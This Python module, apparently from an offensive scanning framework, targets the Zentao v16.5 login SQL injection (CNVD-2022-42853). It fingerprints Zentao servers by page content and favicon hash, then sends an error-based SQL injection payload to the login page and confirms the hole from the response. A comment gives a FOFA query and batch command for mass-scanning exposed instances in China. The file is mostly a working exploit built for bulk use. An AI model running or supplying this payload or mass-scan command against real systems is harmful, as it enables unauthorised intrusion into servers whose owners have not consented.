# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: app="易企天创-禅道系统"
# python3 batch.py -m exploit.scripts.OA.Zentao.unauth_sql -cs -fs app=\"易软天创-禅道系统\" && country=\"CN\""

class Script(BaseScript):
    name = 'Zentao'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.SQLINJECTION
        # 编号
        self.bug_number = 'CNVD-2022-42853'
        # 来源
        self.bug_refer = 'https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go'
        # 特定路径判断
        self.detect_path_list = ['/zentao/', '/']
        # exec
        self.exec_path_list = ['/zentao/user-login.html', '/user-login.html']
        # 相关信息
        self.info = 'Zentao v16.5 SQL注入漏洞'
        # favicon
        self.favicon_md5_list = ['b1d3deb4bd16c8c1637235515deea114']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and ("$('#zentao').addClass('btn-success');" in text or 'zentao/theme' in text or "powered by <a href='http://www.zentao.net' target='_blank'>zentaopms" in text or "href='/zentao/favicon.ico" in text or "'server: cpws'" in text):
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

                url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
                favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if favicon_md5 in self.favicon_md5_list:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        async with aiohttp.ClientSession() as session:
            data = "account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28MD5(1)%29%2C0x7e%29%29%29%23"
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                headers.update({'Content-Type': 'application/x-www-form-urlencoded', 'Referer': url})
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None and 'c4ca4238a0b923820dcc509a6f75849' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://git.flipped.space:9080/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)